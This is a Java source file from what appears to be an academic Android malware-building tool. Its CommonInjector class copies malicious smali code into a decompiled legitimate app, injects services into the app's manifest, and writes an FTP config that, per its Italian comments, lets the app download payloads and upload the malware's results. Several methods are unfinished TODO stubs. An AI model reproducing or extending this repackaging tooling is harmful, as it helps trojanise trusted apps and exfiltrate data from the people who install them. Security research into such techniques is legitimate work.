/**
 *	@author Roberto Falzarano <robertofalzarano@gmail.com>
 */

package it.unisannio.srss.dame.injection;

import it.unisannio.srss.dame.model.FTPServerConfig;
import it.unisannio.srss.utils.DirectoryCopier;
import it.unisannio.srss.utils.FileUtils;
import it.unisannio.srss.utils.ManifestManipulator;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CommonInjector {

	private final static Logger LOG = LoggerFactory
			.getLogger(CommonInjector.class);

	public static final String manifestName = "AndroidManifest.xml";

	final static String CONFIG_FILE = "config.properties";


	/**
	 * Copia il contenuto di una directory in un'altra directory
	 * 
	 * @param commonSmaliSource
	 *            la directory che contiene lo smali da copiare
	 * @param appSmaliPath
	 *            la directory in cui si vuole copiare lo smali
	 * @throws IOException 
	 */
	public static void injectSmali(Path commonSmaliSource, Path appSmaliPath)
			throws IOException {
		// XXX il metodo Files.notExists non è ideale per verificare se un file
		// non esiste perché restituisce false se non è possibile accedere alla
		// directory. Il controllo è stato sostituito.
		FileUtils.checkDir(commonSmaliSource.toFile());
		FileUtils.checkDirForWriting(appSmaliPath.toFile(),false);
//		if (Files.notExists(commonSmaliSource) || Files.notExists(appSmaliPath)) {
//			String msg = "Common smali source or app smali source directory doesn't exist";
//			LOG.error(msg);
//			throw new FileNotFoundException(msg);
//		}

		LOG.info("Start coping common smali from "
				+ commonSmaliSource.toString() + " to "
				+ appSmaliPath.toString());
		try {
			DirectoryCopier.copy(commonSmaliSource, appSmaliPath);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		LOG.info("End coping common smali code");
	}

	/**
	 * Inietta nel manifesto una serie di servizi
	 * 
	 * @param manifestPath
	 *            il path del file che rappresenta il manifesto
	 * @param services
	 *            la lista di servizi che si vuole iniettare
	 * @return <code>true</code> se l'operazione è andata a buon fine,
	 *         <code>false</code> altrimenti.
	 * @throws FileNotFoundException
	 *             se il path che viene indicato e' errato
	 */
	public static boolean injectServices(Path manifestPath, String... services)
			throws FileNotFoundException {
		// TODO manca la modifica del manifest: bisogna (1) aggiungere i servizi
		// al manifest e (2) aggiungere i permessi necessari ai payload scelti
		// dall'utente.
		if (!manifestPath.endsWith(manifestName)) {
			String msg = "Manifest not found";
			LOG.error(msg);
			throw new FileNotFoundException(msg);
		}

		LOG.info("Start adding service to manifest");
		File manifest = manifestPath.toFile();
		ManifestManipulator manifestManipulator = new ManifestManipulator(
				manifest);
		manifestManipulator.addServices(services);
		boolean ret = manifestManipulator.writeOutputManifest();
		LOG.info("End adding service to manifest");

		return ret;
	}

	/**
	 * Inietta la configurazione per la connessione al server ftp nella parte
	 * android del progetto del malware
	 * 
	 * @param appSmaliPath
	 *            il root path in cui e' l'app trusted decompilata
	 * @param ftpURL
	 *            l'url del server ftp
	 * @param username
	 *            lo username per la connessione al server
	 * @param password
	 *            la password per la connessione al server
	 * @param payloadsURI
	 *            l'URI al quale è possibile scaricare i payloads
	 * @param resultURI
	 *            l'URI al quale è possibile caricare i risultati
	 *            dell'esecuzione del malware
	 * @throws IOException
	 */
	public static void injectFtpConfig(Path appSmaliPath, FTPServerConfig serverConfig) throws IOException {
		// TODO manca la generazione del file che contiene url e credenziali del
		// server ftp.
		// assumi che tutte queste informazioni vengono passate come parametri
		Path config = Paths.get(appSmaliPath.toString(), "smali", "it",
				"unisannio", "srss", "dame", "android", CONFIG_FILE);
		
		serverConfig.writeToFile(config.toFile());

	}
}
